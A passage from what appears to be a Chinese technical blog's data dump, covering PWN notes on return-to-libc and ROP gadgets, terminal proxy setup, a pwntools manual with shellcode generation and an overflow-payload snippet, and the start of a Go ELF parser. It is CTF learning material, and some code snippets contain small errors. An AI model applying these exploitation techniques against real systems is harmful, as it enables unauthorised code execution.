可以更换一个命令字符串，一般来说PATH环境变量中已经包含/bin目录，因此只需要找到一个”sh”字符串，将其地址作为system()函数的参数即可。 我们在程序自身空间内就可以找到”sh”这个字符串，同样使用find命令。 12345678910111213141516pwndbg&gt; find /b 0xf7ddc000, 0xf7fb5000, 's','h',00xf7deacd30xf7dead320xf7debe590xf7dec4ac0xf7dee4f60xf7dee5d30xf7deee850xf7def1720xf7f573b5 &lt;__re_error_msgid+117&gt;0xf7f57dc1 &lt;afs.8574+193&gt;0xf7f5a0d40xf7f5bacd12 patterns found.pwndbg&gt; x/s 0xf7deacd30xf7deacd3: \"sh\" Return to PLT 如果动态共享库的地址随机化保护开启，则无法知道libc地址 而程序中已经引用的动态库函数，可以直接通过PLT调用，无需知道实际地址 重新思考Return to Libc 利用Return to Libc，我们调用了system(“/bin/sh”)和exit(0) system()和exit()函数本质上都是以ret指令结尾的代码片段 那如果其他ret结尾的代码片段呢？例如几条指令组成的小代码片段。同样可行！ ROP（Return Oriented Programming） 通过拼接以ret指令结尾的代码片段来实现某些功能的技术，称为ROP 以ret指令结尾的小段代码片段我们称为ROP gadget：例如：pop edx;ret 为实现某-功能拼接而成的多个ROP gadget,我们称为ROP链(ROP Chain） 在栈上(从返回地址开始)填充的用于执行ROP链的数据，我们称为ROP载荷(ROP Payload) ROP技术是Return to libc的扩 展，Return to libc是ROP的一 种特殊情况，即ROP gadget恰好是libc函数的情形 ROP的扩展-JOP、COP 换汤不换药，把使用的的代码片段从ret结尾拓展到jmp/call结尾 JOP（Jump Oriented Programming） pop esi ; jmp dword [esi-0x70] COP（Call Oriented Programming） mov edx,dowrd [esp+0x48] ; call doword [eax+0x10] ROP Gadget 搜索工具 ROPGadget https://github.com/JonathanSalwan/ROPgadget rp https://github.com/0vercl0k/rp ropper https://github.com/sashs/Ropper xrop https://github.com/acama/xrop","categories":[{"name":"长亭PWN笔记","slug":"长亭PWN笔记","permalink":"http://yoursite.com/categories/长亭PWN笔记/"}],"tags":[]},{"title":"Linux让终端走代理的几种方法","slug":"Linux╚├╓╒╢╦╫▀┤·└φ╡─╝╕╓╓╖╜╖¿","date":"2020-04-21T15:40:57.000Z","updated":"2020-04-27T02:56:58.000Z","comments":true,"path":"2020/04/21/Linux╚├╓╒╢╦╫▀┤·└φ╡─╝╕╓╓╖╜╖¿/","link":"","permalink":"http://yoursite.com/2020/04/21/Linux╚├╓╒╢╦╫▀┤·└φ╡─╝╕╓╓╖╜╖¿/","excerpt":"","text":"最近使用终端git的时候觉得速度有点慢，考虑一下是不是可以通过让终端走代理的方式来加快速度，尝试了一下以后确实是可以的。如果只是为了设置git的话可以直接在文章最后找到git的设置代理的方法。 前期准备: 认识代理的方式:代理是通过客户端与服务端通信,传输服务端能够访问到的资源文件,再由服务端客户端通信返回给客户端,从而间接访问服务端能访问的资源. 以socket5通信为例子,我们通过客户端(自己想一想酸酸乳)向服务端发送socket通信,服务端访问资源再由socket通信返回给客户端.但是这里面的通信设置必须通过端口来进行通信,类似switchyomega设置过程一样,我们会设定走的代理方式是127.0.0.1:1080;这个意思就是通过本地的1080端口来进行通信.具体在终端上如何使用呢? 如果默认是socket5通信且端口是1080,即127.0.01:1080的方式 使用如下两种方式 1socks5://127.0.0.1:1080 这里无关自己代理客户端是不是酸酸乳或酸酸只要是通过socket通信即可,前提是满足已经能够正常代理访问. 第二种是http代理,即通信方式为http而不是socket 1http://127.0.0.1:12333 -方法一：（推荐使用） 为什么说这个方法推荐使用呢？因为他只作用于当前终端中，不会影响环境，而且命令比较简单 在终端中直接运行： 1export http_proxy=http://proxyAddress:port 如果你是SSR,并且走的http的代理端口是12333，想执行wget或者curl来下载国外的东西，可以使用如下命令： 1export http_proxy=http://127.0.0.1:12333 如果是https那么就经过如下命令： 1export https_proxy=http://127.0.0.1:12333 方法二 ： 这个办法的好处是把代理服务器永久保存了，下次就可以直接用了 把代理服务器地址写入shell配置文件.bashrc或者.zshrc 直接在.bashrc或者.zshrc添加下面内容 12export http_proxy=&quot;http://localhost:port&quot;export https_proxy=&quot;http://localhost:port&quot; 或者走socket5协议（ss,ssr）的话，代理端口是1080 12export http_proxy=&quot;socks5://127.0.0.1:1080&quot;export https_proxy=&quot;socks5://127.0.0.1:1080&quot; 或者干脆直接设置ALL_PROXY 1export ALL_PROXY=socks5://127.0.0.1:1080 最后在执行如下命令应用设置 1source ~/.bashrc 或者通过设置alias简写来简化操作，每次要用的时候输入setproxy，不用了就unsetproxy。 1alias setproxy=\"export ALL_PROXY=socks5://127.0.0.1:1080\" alias unsetproxy=\"unset ALL_PROXY\" 方法三:改相应工具的配置，比如apt的配置 1sudo vim /etc/apt/apt.conf 在文件末尾加入下面这行 1Acquire::http::Proxy &quot;http://proxyAddress:port&quot; 重点来了！！如果说经常使用git对于其他方面都不是经常使用，可以直接配置git的命令。 使用ss/ssr来加快git的速度直接输入这个命令就好了 12git config --global http.proxy &apos;socks5://127.0.0.1:1080&apos; git config --global https.proxy &apos;socks5://127.0.0.1:1080&apos;","categories":[{"name":"Linux杂记","slug":"Linux杂记","permalink":"http://yoursite.com/categories/Linux杂记/"}],"tags":[]},{"title":"PWNTOOLS个人手册","slug":"PWNTOOLS╕÷╚╦╩╓▓ß","date":"2020-04-18T08:48:38.000Z","updated":"2020-04-18T23:48:56.000Z","comments":true,"path":"2020/04/18/PWNTOOLS╕÷╚╦╩╓▓ß/","link":"","permalink":"http://yoursite.com/2020/04/18/PWNTOOLS╕÷╚╦╩╓▓ß/","excerpt":"","text":"项目主页：http://pwntools.com/ 项目地址：https://github.com/Gallopsled/pwntools 安装12345678＃更新包sudo apt-get update＃安装必要的组件sudo apt-get install -y python2.7 python -pip python-dev git libssl-dev libffi-dev build-essential＃升级Python的包管理器pip install --upgrade pip＃安装pwntools sudo pip install --upgrade pwntools 模块列表123456789101112131415161718192021222324- pwnlib.adb — Android Debug Bridge- pwnlib.asm — Assembler functions- pwnlib.encoders — Encoding Shellcode- pwnlib.elf — ELF Executables and Libraries- pwnlib.exception — Pwnlib exceptions- pwnlib.flag — CTF Flag Management- pwnlib.fmtstr — Format string bug exploitation tools- pwnlib.gdb — Working with GDB- pwnlib.log — Logging stuff- pwnlib.protocols — Wire Protocols- pwnlib.rop — Return Oriented Programming- pwnlib.runner — Running Shellcode- pwnlib.shellcraft — Shellcode generation- pwnlib.shellcraft.&lt;architecture&gt;- pwnlib.term — Terminal handling- pwnlib.timeout — Timeout handling- pwnlib.tubes — Talking to the World!- pwnlib.tubes.&lt;process|serialtube|SSH&gt;- pwnlib.update — Updating Pwntools- pwnlib.useragents — A database of useragent strings- pwnlib.util.cyclic — Generation of unique sequences- pwnlib.util.fiddling — Utilities bit fiddling- pwnlib.util.net — Networking interfaces- pwnlib.util.packing — Packing and unpacking of strings 使用1from pwn import * 模块介绍常用模块如下： asm : 汇编与反汇编，支持x86/x64/arm/mips/powerpc等基本上所有的主流平台 dynelf : 用于远程符号泄漏，需要提供leak方法 elf : 对elf文件进行操作 gdb : 配合gdb进行调试 memleak : 用于内存泄漏 shellcraft : shellcode的生成器 tubes : 包括tubes.sock, tubes.process, tubes.ssh, tubes.serialtube，分别适用于不同场景的PIPE utils : 一些实用的小功能，例如CRC计算，cyclic pattern等 链接123本地 ：sh = porcess(&quot;./level0&quot;)远程：sh = remote(&quot;127.0.0.1&quot;,10001)关闭连接：sh.close() pwn库中最常用的部分之一是，它允许您轻松地连接到Web服务并执行操作。pwntools的入门文档中包含的一个示例是连接到overthewire的 bandit CTF实验室。Overthewire是一款在线信息安全CTF通关网站，你可以在线Hacking,并为任何刚接触Linux / CLI 等的初级人员提供了手把手教学。我们可以利用pwn库创建到主机的SSH连接，并对其运行任意命令。每个bandit级别的目标是找到进入下一级别的密码。例如：利用pwntools，您可以开发一个脚本来将SSH连接到目标主机，并运行一系列自动信息收集探针，以确定如何以最佳方式对其进行攻击。一个不错的例子 1234567891011121314# Connect to the targetshell = ssh(&apos;bandit0&apos;, &apos;bandit.labs.overthewire.org&apos;, password=&apos;bandit0&apos;, port=2220)# Create an initial processsh = shell.run(&apos;sh&apos;)# Send the process argumentssh.sendline(&apos;ls -la&apos;)# Receive output from the executed commandsh.recvline(timeout=5)......# Obtain the first flag (password for bandit1)sh.sendline(&apos;cat readme&apos;)# Print the flagsh.recvline(timeout=5) IO模块12345678sh.send(data) 发送数据sh.sendline(data) 发送一行数据，相当于在数据后面加\\nsh.recv(numb = 2048, timeout = dufault) 接受数据，numb指定接收的字节，timeout指定超时sh.recvline(keepends=True) 接受一行数据，keepends为是否保留行尾的\\nsh.recvuntil(&quot;Hello,World\\n&quot;,drop=fasle) 接受数据直到我们设置的标志出现sh.recvall() 一直接收直到EOFsh.recvrepeat(timeout = default) 持续接受直到EOF或timeoutsh.interactive() 直接进行交互，相当于回到shell的模式，在取得shell之后使用 汇编和反汇编汇编： 1234&gt;&gt;&gt; asm(&apos;nop&apos;)&apos;\\x90&apos;&gt;&gt;&gt; asm(&apos;nop&apos;, arch=&apos;arm&apos;)&apos;\\x00\\xf0 \\xe3&apos; 可以使用context来指定cpu类型以及操作系统。context是pwntools用来设置环境的功能。在很多时候，由于二进制文件的情况不同，我们可能需要进行一些环境设置才能够正常运行exp，比如有一些需要进行汇编，但是32的汇编和64的汇编不同，如果不设置context会导致一些问题。 1234&gt;&gt;&gt; context.arch = &apos;i386&apos;&gt;&gt;&gt; context.os = &apos;linux&apos;&gt;&gt;&gt; context.endian = &apos;little&apos;&gt;&gt;&gt; context.word_size = 32 一般来说我们设置context只需要简单的一句话: 1context(os=&apos;linux&apos;, arch=&apos;amd64&apos;, log_level=&apos;debug&apos;) 使用disasm进行反汇编 12345&gt;&gt;&gt; print disasm(&apos;6a0258cd80ebf9&apos;.decode(&apos;hex&apos;)) 0: 6a 02 push 0x2 2: 58 pop eax 3: cd 80 int 0x80 5: eb f9 jmp 0x0 注意，asm需要binutils中的as工具辅助，如果是不同于本机平台的其他平台的汇编，例如在我的x86机器上进行mips的汇编就会出现as工具未找到的情况，这时候需要安装其他平台的cross-binutils shellcode生成器12345678&gt;&gt;&gt; print shellcraft.i386.nop().strip(&apos;\\n&apos;) nop&gt;&gt;&gt; print shellcraft.i386.linux.sh() /* push &apos;/bin///sh\\x00&apos; */ push 0x68 push 0x732f2f2f push 0x6e69622f... 结合asm可以可以得到最终的pyaload 12345678from pwn import *context(os=&apos;linux&apos;,arch=&apos;amd64&apos;)shellcode = asm(shellcraft.sh())或者from pwn import *shellcode = asm(shellcraft.amd64.linux.sh()) 除了直接执行sh之外，还可以进行其它的一些常用操作例如提权、反向连接等等 ELF文件操作12345678910&gt;&gt;&gt; e = ELF(&apos;/bin/cat&apos;)&gt;&gt;&gt; print hex(e.address) # 文件装载的基地址0x400000&gt;&gt;&gt; print hex(e.symbols[&apos;write&apos;]) # 函数地址0x401680&gt;&gt;&gt; print hex(e.got[&apos;write&apos;]) # GOT表的地址0x60b070&gt;&gt;&gt; print hex(e.plt[&apos;write&apos;]) # PLT的地址0x401680&gt;&gt;&gt; print hex(e.search(&apos;/bin/sh&apos;).next())# 字符串/bin/sh的地址 整数pack与数据unpackpack：p32，p64unpack：u32，u64 12345from pwn import *elf = ELF(&apos;./level0&apos;)sys_addr = elf.symbols[&apos;system&apos;]payload = &apos;a&apos; * (0x80 + 0x8) + p64(sys_addr)... 还可以调整大端序和小端序 1234567891011121314# Create some variable with an addressaddr = 0xabcdef12# 32-bit: Big Endianp32(addr, endian=&quot;big&quot;# 32-bit: Little Endianp32(addr, endian=&quot;big&quot;# 32-bit: Default is Little Endianp32(addr)# 64-bit: Big Endianp64(addr, endian=&quot;big&quot;)# 64-bit: Little Endianp64(addr, endian=&quot;small&quot;)# 64-bit: Default is Little Endianp64(addr) ROP链生成器12345678910elf = ELF(&apos;ropasaurusrex&apos;)rop = ROP(elf)rop.read(0, elf.bss(0x80))rop.dump()# [&apos;0x0000: 0x80482fc (read)&apos;,# &apos;0x0004: 0xdeadbeef&apos;,# &apos;0x0008: 0x0&apos;,# &apos;0x000c: 0x80496a8&apos;]str(rop)# &apos;\\xfc\\x82\\x04\\x08\\xef\\xbe\\xad\\xde\\x00\\x00\\x00\\x00\\xa8\\x96\\x04\\x08&apos; 使用ROP(elf)来产生一个rop的对象，这时rop链还是空的，需要在其中添加函数。 因为ROP对象实现了getattr的功能，可以直接通过func call的形式来添加函数，rop.read(0, elf.bss(0x80))实际相当于rop.call(‘read’, (0, elf.bss(0x80)))。 通过多次添加函数调用，最后使用str将整个rop chain dump出来就可以了。 call(resolvable, arguments=()) : 添加一个调用，resolvable可以是一个符号，也可以是一个int型地址，注意后面的参数必须是元组否则会报错，即使只有一个参数也要写成元组的形式(在后面加上一个逗号) chain() : 返回当前的字节序列，即payload dump() : 直观地展示出当前的rop chain raw() : 在rop chain中加上一个整数或字符串 search(move=0, regs=None, order=’size’) : 按特定条件搜索gadget unresolve(value) : 给出一个地址，反解析出符号 数据输出如果需要输出一些信息,最好使用pwntools自带的,因为和pwntools本来的格式吻合,看起来也比较舒服,用法: 12some_str = &quot;hello, world&quot;log.info(some_str) 其中的info代表是log等级，也可以使用其他log等级","categories":[],"tags":[]},{"title":"从理解ELF到手写Readelf解析器（一）","slug":"┤╙└φ╜ΓELF╡╜╩╓╨┤Readelf╜Γ╬÷╞≈ú¿╥╗ú⌐","date":"2020-04-12T11:36:31.000Z","updated":"2020-04-13T02:38:18.000Z","comments":true,"path":"2020/04/12/┤╙└φ╜ΓELF╡╜╩╓╨┤Readelf╜Γ╬÷╞≈ú¿╥╗ú⌐/","link":"","permalink":"http://yoursite.com/2020/04/12/┤╙└φ╜ΓELF╡╜╩╓╨┤Readelf╜Γ╬÷╞≈ú¿╥╗ú⌐/","excerpt":"","text":"（本文所有代码均基于Go语言，ELF文件为32位） 前言本人普通大二学生水平有限，可能错误许多的，还希望大佬们能帮指证修改 项目地址：https://github.com/suyucheng-lz/ELF32_Read 目前实现的效果readelf的解析数据：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778syc@ubuntu:~/Desktop/share$ readelf -h helloELF Header: Magic: 7f 45 4c 46 01 01 01 00 00 00 00 00 00 00 00 00 Class: ELF32 Data: 2&apos;s complement, little endian Version: 1 (current) OS/ABI: UNIX - System V ABI Version: 0 Type: EXEC (Executable file) Machine: Intel 80386 Version: 0x1 Entry point address: 0x8048310 Start of program headers: 52 (bytes into file) Start of section headers: 6112 (bytes into file) Flags: 0x0 Size of this header: 52 (bytes) Size of program headers: 32 (bytes) Number of program headers: 9 Size of section headers: 40 (bytes) Number of section headers: 31 Section header string table index: 28 Elf file type is EXEC (Executable file)Entry point 0x8048310There are 9 program headers, starting at offset 52Program Headers: Type Offset VirtAddr PhysAddr FileSiz MemSiz Flg Align PHDR 0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4 INTERP 0x000154 0x08048154 0x08048154 0x00013 0x00013 R 0x1 [Requesting program interpreter: /lib/ld-linux.so.2] LOAD 0x000000 0x08048000 0x08048000 0x005c8 0x005c8 R E 0x1000 LOAD 0x000f08 0x08049f08 0x08049f08 0x00114 0x00118 RW 0x1000 DYNAMIC 0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW 0x4 NOTE 0x000168 0x08048168 0x08048168 0x00044 0x00044 R 0x4 GNU_EH_FRAME 0x0004d0 0x080484d0 0x080484d0 0x0002c 0x0002c R 0x4 GNU_STACK 0x000000 0x00000000 0x00000000 0x00000 0x00000 RW 0x10 GNU_RELRO 0x000f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R 0x1 There are 31 section headers, starting at offset 0x17e0:Section Headers: [Nr] Name Type Addr Off Size ES Flg Lk Inf Al [ 0] NULL 00000000 000000 000000 00 0 0 0 [ 1] .interp PROGBITS 08048154 000154 000013 00 A 0 0 1 [ 2] .note.ABI-tag NOTE 08048168 000168 000020 00 A 0 0 4 [ 3] .note.gnu.build-i NOTE 08048188 000188 000024 00 A 0 0 4 [ 4] .gnu.hash GNU_HASH 080481ac 0001ac 000020 04 A 5 0 4 [ 5] .dynsym DYNSYM 080481cc 0001cc 000050 10 A 6 1 4 [ 6] .dynstr STRTAB 0804821c 00021c 00004c 00 A 0 0 1 [ 7] .gnu.version VERSYM 08048268 000268 00000a 02 A 5 0 2 [ 8] .gnu.version_r VERNEED 08048274 000274 000020 00 A 6 1 4 [ 9] .rel.dyn REL 08048294 000294 000008 08 A 5 0 4 [10] .rel.plt REL 0804829c 00029c 000010 08 AI 5 24 4 [11] .init PROGBITS 080482ac 0002ac 000023 00 AX 0 0 4 [12] .plt PROGBITS 080482d0 0002d0 000030 04 AX 0 0 16 [13] .plt.got PROGBITS 08048300 000300 000008 00 AX 0 0 8 [14] .text PROGBITS 08048310 000310 000192 00 AX 0 0 16 [15] .fini PROGBITS 080484a4 0004a4 000014 00 AX 0 0 4 [16] .rodata PROGBITS 080484b8 0004b8 000015 00 A 0 0 4 [17] .eh_frame_hdr PROGBITS 080484d0 0004d0 00002c 00 A 0 0 4 [18] .eh_frame PROGBITS 080484fc 0004fc 0000cc 00 A 0 0 4 [19] .init_array INIT_ARRAY 08049f08 000f08 000004 00 WA 0 0 4 [20] .fini_array FINI_ARRAY 08049f0c 000f0c 000004 00 WA 0 0 4 [21] .jcr PROGBITS 08049f10 000f10 000004 00 WA 0 0 4 [22] .dynamic DYNAMIC 08049f14 000f14 0000e8 08 WA 6 0 4 [23] .got PROGBITS 08049ffc 000ffc 000004 04 WA 0 0 4 [24] .got.plt PROGBITS 0804a000 001000 000014 04 WA 0 0 4 [25] .data PROGBITS 0804a014 001014 000008 00 WA 0 0 4 [26] .bss NOBITS 0804a01c 00101c 000004 00 WA 0 0 1 [27] .comment PROGBITS 00000000 00101c 000035 01 MS 0 0 1 [28] .shstrtab STRTAB 00000000 0016d3 00010a 00 0 0 1 [29] .symtab SYMTAB 00000000 001054 000450 10 30 47 4 [30] .strtab STRTAB 00000000 0014a4 00022f 00 0 0 1Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings) I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown) O (extra OS processing required) o (OS specific), p (processor specific) 我实现的效果： 123456789101112131415161718192021222324252627282930313233343536373839There are 31 section headers, starting at offset 0x17e0:Section Headers: [Nr] Name Type Addr Off Size ES Flg Lk Inf Al [ 0] NULL 00000000 000000 000000 00 0 0 0 [ 1] .interp PROGBITS 08048154 000154 000013 00 A 0 0 1 [ 2] .note.ABI-tag NOTE 08048168 000168 000020 00 A 0 0 4 [ 3] .note.gnu.build-i NOTE 08048188 000188 000024 00 A 0 0 4 [ 4] .gnu.hash GNU_HASH 080481ac 0001ac 000020 04 A 5 0 4 [ 5] .dynsym DYNSYM 080481cc 0001cc 000050 10 A 6 1 4 [ 6] .dynstr STRTAB 0804821c 00021c 00004c 00 A 0 0 1 [ 7] .gnu.version VERSYM 08048268 000268 00000a 02 A 5 0 2 [ 8] .gnu.version_r VERNEED 08048274 000274 000020 00 A 6 1 4 [ 9] .rel.dyn REL 08048294 000294 000008 08 A 5 0 4 [10] .rel.plt REL 0804829c 00029c 000010 08 AI 5 24 4 [11] .init PROGBITS 080482ac 0002ac 000023 00 AX 0 0 4 [12] .plt PROGBITS 080482d0 0002d0 000030 04 AX 0 0 16 [13] .plt.got PROGBITS 08048300 000300 000008 00 AX 0 0 8 [14] .text PROGBITS 08048310 000310 000192 00 AX 0 0 16 [15] .fini PROGBITS 080484a4 0004a4 000014 00 AX 0 0 4 [16] .rodata PROGBITS 080484b8 0004b8 000015 00 A 0 0 4 [17] .eh_frame_hdr PROGBITS 080484d0 0004d0 00002c 00 A 0 0 4 [18] .eh_frame PROGBITS 080484fc 0004fc 0000cc 00 A 0 0 4 [19] .init_array INIT_ARRAY 08049f08 000f08 000004 00 WA 0 0 4 [20] .fini_array FINI_ARRAY 08049f0c 000f0c 000004 00 WA 0 0 4 [21] .jcr PROGBITS 08049f10 000f10 000004 00 WA 0 0 4 [22] .dynamic DYNAMIC 08049f14 000f14 0000e8 08 WA 6 0 4 [23] .got PROGBITS 08049ffc 000ffc 000004 04 WA 0 0 4 [24] .got.plt PROGBITS 0804a000 001000 000014 04 WA 0 0 4 [25] .data PROGBITS 0804a014 001014 000008 00 WA 0 0 4 [26] .bss NOBITS 0804a01c 00101c 000004 00 WA 0 0 1 [27] .comment PROGBITS 00000000 00101c 000035 01 MS 0 0 1 [28] .shstrtab STRTAB 00000000 0016d3 00010a 00 0 0 1 [29] .symtab SYMTAB 00000000 001054 000450 10 30 47 4 [30] .strtab STRTAB 00000000 0014a4 00022f 00 0 0 1Key to Flags: W (write), A (alloc), X (execute), M (merge), S (strings) I (info), L (link order), G (group), T (TLS), E (exclude), x (unknown) O (extra OS processing required) o (OS specific), p (processor specific) 概述首先在解析之前， 必须对数据类型格式声明一下 名称 大小（byte） 说明 Elf32_Addr 4 无符号程序地址 Elf32_Half 2 无符号中等整数 Elf32_Off 4 无符号文件偏移 Elf32_SWord 4 有符号大整数 Elf32_Word 4 无符号大整数 unsigned char 1 无符号笑整数 我在Go语言里面如此定义： 1234567const EI_NIDENT = 16type Elf32_Addr = uint32 //4个字节type Elf32_Half = uint16 //2个字节type Elf32_Off = uint32 //4个字节type Elf32_SWord = int32 //4个字节type Elf32_Word = uint32 //4个字节type u_char = byte //1个字节（uint8) 一个ELF文件可以被标记为一下几种类型： ET_NONE：未知类型。这个标记表明文件类型不确定，或者还未定义 ET_REL：重定位文件。ELF类型标记为relocatable意味着该文件被标记为了一段可重定位的代码，有时也称为目标文件。可重定位目标文件通常是还未被链接到可执行程序的一段位置独立的代码（position independent code）。在编译完代码之后通常可以看到一个.o格式的文件，这种文件包含了创建可执行文件所需要的代码和数据 ET_EXEC：可执行文件。ELF类型为executable，表明这个文件被标记为可执行文件。这种类型的文件也称为程序，是一个进程开始执行的入口 ET_DYN：共享目标文件。ELF类型为dynamic，意味着该文件被标记为了一个动态的可链接的目标文件，也称为共享库。这类共享库会在程序运行时被装载并链接到程序的进程镜像中 ET_CORE：核心文件。在程序崩溃或者进程传递了一个SIGSEGV信号（分段违规）时，会在核心文件中记录整个进程的镜像信息。可以使用GDB读取这类文件来辅助调试并查找程序崩溃的原因 对于一个ELF文件主要由以下这几个部分组成： ELF Header：ELF头部。每个ELF文件都必须存在一个ELF_Header,这里存放了很多重要的信息用来描述整个文件的组织,如: 版本信息,入口信息,偏移信息等。程序执行也必须依靠其提供的信息 Program Header Table：程序头部表。可选的一个表，用于告诉系统如何在内存中创建映像,在图中也可以看出来,有程序头部表才有段,有段就必须有程序头部表。其中存放各个段的基本信息(包括地址指针) Section Header Table：节区头部表。类似与Program_Header_Table,但与其相对应的是节区(Section) Section：节区。将文件分成一个个节区，每个节区都有其对应的功能，如符号表，哈希表等 Segment：段。就是将文件分成一段一段映射到内存中。段中通常包括一个或多个节区 每个节区都应该是前后相连的，且不可有重叠。即在一个地址上的字节只能属于一个节区 ELF Header概述首先我们得先熟悉并且理解ELF Header的结构体定义开始： 名称 类型 e_ident[EI_NIDENT] unsigned char e_type Elf32_Half e_machine Elf32_Half e_version Elf32_Word e_entry Elf32_Addr e_phoff Elf32_Off e_shoff Elf32_Off e_flags Elf32_Word e_ehsize Elf32_Half e_phentsize Elf32_Half e_phnum Elf32_Half e_shentsize Elf32_Half e_shnum Elf32_Half e_shstrndx Elf32_Half 最后程序中的样子，对于e_ident我做一了点修改为了方便后续程序编写： 1234567891011121314151617181920212223242526272829303132333435363738394041424344type Elf32_Ehdr struct &#123; //e_ident [EI_NIDENT]u_char Ehdr_Magic string Ehdr_Class int Ehdr_Data int Ehdr_Version int Ehdr_OS int Ehdr_ABIV int /* e_ident 这是一个数组,其每个字节又都有所代表的含义 EI_MAG0 - EI_MAG3 文件标识就是平时所说的ELF头 EI_CLASS 文件类,其实代表的是32位/64位程序 EI_DATA 数据编码,一般都是01[td] EI_VERSION 文件版本,固定值01 EV_CURRENT EI_PAD 呃…就是一堆全是00的用来补全大小的数组 EI_NIDENT 说是e_ident数组的大小,但我看了好几个so都是00 */ e_type Elf32_Half //标识文件类型 e_machine Elf32_Half //声明ABI e_version Elf32_Word //跟ident[]里的EI_VERSION一样,为01 e_entry Elf32_Addr //可执行程序入口点地址 e_phoff Elf32_Off //Program Header Offset,程序头部表索引地址,没有则为0 e_shoff Elf32_Off //Section Header Offset,节区表索引地址,没有则为0 e_flags Elf32_Word //保存与文件相关的，特定于处理器的标志。 e_ehsize Elf32_Half //ELF_Header Size,ELF头部的大小 e_phentsize Elf32_Half //程序头部表的单个表项的大小 e_phnum Elf32_Half //程序头部表的表项数 e_shentsize Elf32_Half //节区表的单个表项的大小 e_shnum Elf32_Half //节区表的表项数 e_shstrndx Elf32_Half //String Table Index,在节区表中有一个存储各节区名称的节区,这里表示名称表在第几个节区。&#125; 下面开始逐步解释各个字段 e_ident目标文件标识。详细描述该二进制文件对应的体系结构，其每个字节又都有所代表的含义，包括对应的字长，CPU架构，大小端 EI_MAG0 - EI_MAG3（文件标识）默认值就是：7F 45 4C 46，即ELF EI_CLASS（文件类） 取值 代表 含义 01 ELFCLASS32 32位程序 02 ELFCLASS64 64位程序 Go代码： 1234EhdrClass := map[int]string&#123; 1: \"ELF32\", 2: \"ELF64\", &#125; EI_DATA（数据编码） 取值 代表 含义 01 ELFDATA2LSB 小端序 02 ELFDATA2MSB 大端序 Go代码： 1234EhdrData := map[int]string&#123; 1:\"2's complement, little endian\", 2:\"2's complement, big endian\", &#125; EI_VERSION(文件版本)固定值01 EV_CURRENT Go代码： 123EhdrVersion := map[int]string&#123; 1:\"1 (current)\", &#125; EI_OSABI(OS类型)12345678910111213141516171819EhdrOSABI := map[int]string&#123; 0x0 : \"UNIX - System V\", 0x1 : \"Hewlett-Packard HP-UX\", 0x2 : \"NetBSD\", 0x3 : \"Linux\", 0x6 : \"Sun Solaris\", 0x7 : \"AIX\", 0x8 : \"IRIX\", 0x9 : \"FreeBSD\", 0xA : \"Compaq TRU64 UNIX\", 0xB : \"Novell Modesto\", 0xC : \"Open BSD\", 0xD : \"Open VMS\", 0xE : \"Hewlett-Packard Non-Stop Kernel\", 0xF : \"Amiga Research OS\", 0x40: \"ARM EABI\", 0x61: \"ARM\", 0xFF: \"Standalone (embedded applications)\", &#125; EI_ABIVERSIONABI版本 EI_PAD为保留字节的开始，默认为0 EI_NIDENTe_ident数组的大小，但一般默认值为0 最后可以得到解析e_ident的代码： 12345678910111213141516171819func (Ehdr Elf32_Ehdr) ReadMagic(data []byte)Elf32_Ehdr&#123; var MagicNum = data[:16] //Ehdr.e_ident = u_char(MagicNum) for _,value := range MagicNum&#123; Ehdr.Ehdr_Magic += Change.DecHex(int64(value)) Ehdr.Ehdr_Magic += \" \" &#125; //Ehdr_Class Ehdr.Ehdr_Class = int(MagicNum[4]) //Ehdr_Data Ehdr.Ehdr_Data = int(MagicNum[5]) //Ehdr_Version Ehdr.Ehdr_Version = int(MagicNum[6]) //Ehdr_OS Ehdr.Ehdr_OS = int(MagicNum[7]) //Ehdr_ABIV Ehdr.Ehdr_ABIV = int(MagicNum[8]) return Ehdr&#125; e_type目标文件类型 1234567891011EhdrType := map[int]string&#123; 0x0 : \"NONE\",//No file type 0x1 : \"REL\",//Relocatable 0x2 : \"EXEC\",//Executable 0x3 : \"DYN\",//Shared object 0x4 : \"CORE\",//Core 0xfe00 : \"LOOS\",//OS specific 0xfeff : \"HIOS\",//OS specific 0xff00 : \"LOPROC\",//Processor specific 0xffff : \"HIPROC\",//Processor specific &#125; e_machine文件的目标体系结构类型 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112EhdrMachine := map[int]string&#123; 0 : \"No machine\", 1 : \"AT&amp;T WE 32100\", 2 : \"SPARC\", 3 : \"Intel 80386\", 4 : \"Motorola 68000\", 5 : \"Motorola 88000\", 6 : \"Reserved for future use (was EM_486)\", 7 : \"Intel 80860\", 8 : \"MIPS I Architecture\", 9 : \"IBM System/370 Processor\", 10 : \"MIPS RS3000 Little-endian\", 11 : \"Reserved for future use\", 12 : \"Reserved for future use\", 13 : \"Reserved for future use\", 14 : \"Reserved for future use\", 15 : \"Hewlett-Packard PA-RISC\", 16 : \"Reserved for future use\", 17 : \"Fujitsu VPP500\", 18 : \"Enhanced instruction set SPARC\", 19 : \"Intel 80960\", 20 : \"PowerPC\", 21 : \"64-bit PowerPC\", 22 : \"IBM System/390 Processor\", 23 : \"Reserved for future use\", 24 : \"Reserved for future use\", 25 : \"Reserved for future use\", 26 : \"Reserved for future use\", 27 : \"Reserved for future use\", 28 : \"Reserved for future use\", 29 : \"Reserved for future use\", 30 : \"Reserved for future use\", 31 : \"Reserved for future use\", 32 : \"Reserved for future use\", 33 : \"Reserved for future use\", 34 : \"Reserved for future use\", 35 : \"Reserved for future use\", 36 : \"NEC V800\", 37 : \"Fujitsu FR20\", 38 : \"TRW RH-32\", 39 : \"Motorola RCE\", 40 : \"Advanced RISC Machines ARM\", 41 : \"Digital Alpha\", 42 : \"Hitachi SH\", 43 : \"SPARC Version 9\", 44 : \"Siemens TriCore embedded processor\", 45 : \"Argonaut RISC Core, Argonaut Technologies Inc.\", 46 : \"Hitachi H8/300\", 47 : \"Hitachi H8/300H\", 48 : \"Hitachi H8S\", 49 : \"Hitachi H8/500\", 50 : \"Intel IA-64 processor architecture\", 51 : \"Stanford MIPS-X\", 52 : \"Motorola ColdFire\", 53 : \"Motorola M68HC12\", 54 : \"Fujitsu MMA Multimedia Accelerator\", 55 : \"Siemens PCP\", 56 : \"Sony nCPU embedded RISC processor\", 57 : \"Denso NDR1 